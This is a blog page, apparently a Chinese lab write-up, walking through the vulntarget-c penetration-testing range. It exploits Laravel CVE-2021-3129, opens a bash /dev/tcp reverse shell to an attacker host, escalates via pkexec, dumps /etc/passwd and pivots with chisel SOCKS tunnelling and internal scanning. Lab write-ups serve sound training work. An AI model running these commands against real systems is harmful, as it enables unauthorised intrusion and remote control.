@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="此靶场来自于星期五实验室 微信号: Friday_LAB  信息收集1nmap -T4 -A -sV -v -Pn 192.168.189.151   80端口是个Laravel  google搜寻公开可利用的exp Laravel &lt;&#x3D; v8.4.2 debug mode: Remote code execution (CVE-2021-3129) Laravel getshe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget - c 靶场 WriteUp">
+<meta property="og:url" content="http://example.com/posts/3260537659/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="此靶场来自于星期五实验室 微信号: Friday_LAB  信息收集1nmap -T4 -A -sV -v -Pn 192.168.189.151   80端口是个Laravel  google搜寻公开可利用的exp Laravel &lt;&#x3D; v8.4.2 debug mode: Remote code execution (CVE-2021-3129) Laravel getshe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-06-28.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-07-47.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-46-49.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-43-03.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-15-12.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-49-34.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-53-33.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-56-04.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-58-21.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_13-17-51.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_15-35-08.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-19-58.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-25-29.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-27-56.png">
+<meta property="article:published_time" content="2022-02-20T04:04:24.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.491Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-06-28.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>vulntarget - c 靶场 WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/3787765405/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/2446613835/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3260537659/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3260537659/&text=vulntarget - c 靶场 WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3260537659/&is_video=false&description=vulntarget - c 靶场 WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulntarget - c 靶场 WriteUp&body=Check out this article: http://example.com/posts/3260537659/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3260537659/&name=vulntarget - c 靶场 WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3260537659/&t=vulntarget - c 靶场 WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Laravel-getshell"><span class="toc-number">2.</span> <span class="toc-text">Laravel getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chisel-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">2.2.</span> <span class="toc-text">chisel 内网穿透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E6%84%8F%E5%A4%96"><span class="toc-number">3.</span> <span class="toc-text">一点意外</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        vulntarget - c 靶场 WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-20T04:04:24.000Z" itemprop="datePublished">2022-02-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>此靶场来自于星期五实验室 微信号: Friday_LAB</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sV -v -Pn 192.168.189.151</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-06-28.png" alt="Xnip2022-02-24_12-06-28"></p>
+<p>80端口是个Laravel</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-07-47.png" alt="Xnip2022-02-24_12-07-47"></p>
+<p>google搜寻公开可利用的<a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">exp</a> Laravel &lt;&#x3D; v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</p>
+<h2 id="Laravel-getshell"><a href="#Laravel-getshell" class="headerlink" title="Laravel getshell"></a>Laravel getshell</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-24_12-46-49.png" alt="Xnip2022-02-24_12-46-49"></p>
+<p>反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.189.133/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改exp</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-43-03.png" alt="Xnip2022-02-25_11-43-03"></p>
+<p>攻击机监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwncat-cs :9999</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py http://192.168.189.151/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-15-12.png" alt="Xnip2022-02-25_11-15-12"></p>
+<p>获得目标www-data权限会话</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-49-34.png" alt="Xnip2022-02-25_11-49-34"></p>
+<p>pkexec提权即可</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-53-33.png" alt="Xnip2022-02-25_11-53-33"></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route <span class="comment">#查看路由表</span></span><br></pre></td></tr></table></figure>
+
+<p>发现192.168.112.0&#x2F;24的内网段</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-56-04.png" alt="Xnip2022-02-25_11-56-04"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-25_11-58-21.png" alt="Xnip2022-02-25_11-58-21"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">vulntarget:x:1000:1000:vulntarget:/home/vulntarget:/bin/bash</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="chisel-内网穿透"><a href="#chisel-内网穿透" class="headerlink" title="chisel 内网穿透"></a>chisel 内网穿透</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8888 --reverse &amp; <span class="comment">#攻击机监听</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client 192.168.189.133:8888 R:socks  &amp;<span class="comment">#目标机执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_13-17-51.png" alt="Xnip2022-02-28_13-17-51"></p>
+<p>配置proxychains</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+
+
+<p>fscan扫一下192.168.112.0&#x2F;24这个网段，没扫到，估计是windows开了防火墙的原因，使用msf扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.112.0/24 -o ok.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_15-35-08.png" alt="Xnip2022-02-28_15-35-08"></p>
+<p>192.168.112.131开了80</p>
+<h2 id="一点意外"><a href="#一点意外" class="headerlink" title="一点意外"></a>一点意外</h2><p>代理成功，但是网页显示有点问题，我在本机以及虚拟机内的浏览器都无法正常显示和跳转</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-19-58.png" alt="Xnip2022-02-28_14-19-58"></p>
+<p>这个问题暂时解决不了，也没时间解决，就先跳过这部分，关于这部分攻击过程可以看公众号的内容，后面也没啥东西了，懒得打了，我把最后一台linux打一下</p>
+<p>登录上3389发现有MobaXterm,上面有一台linux</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-25-29.png" alt="Xnip2022-02-28_14-25-29"></p>
+<p>直接使用pkexec提权至root即可</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/Xnip2022-02-28_14-27-56.png" alt="Xnip2022-02-28_14-27-56"></p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Laravel-getshell"><span class="toc-number">2.</span> <span class="toc-text">Laravel getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chisel-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">2.2.</span> <span class="toc-text">chisel 内网穿透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E6%84%8F%E5%A4%96"><span class="toc-number">3.</span> <span class="toc-text">一点意外</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3260537659/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3260537659/&text=vulntarget - c 靶场 WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3260537659/&is_video=false&description=vulntarget - c 靶场 WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulntarget - c 靶场 WriteUp&body=Check out this article: http://example.com/posts/3260537659/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3260537659/&title=vulntarget - c 靶场 WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3260537659/&name=vulntarget - c 靶场 WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3260537659/&t=vulntarget - c 靶场 WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
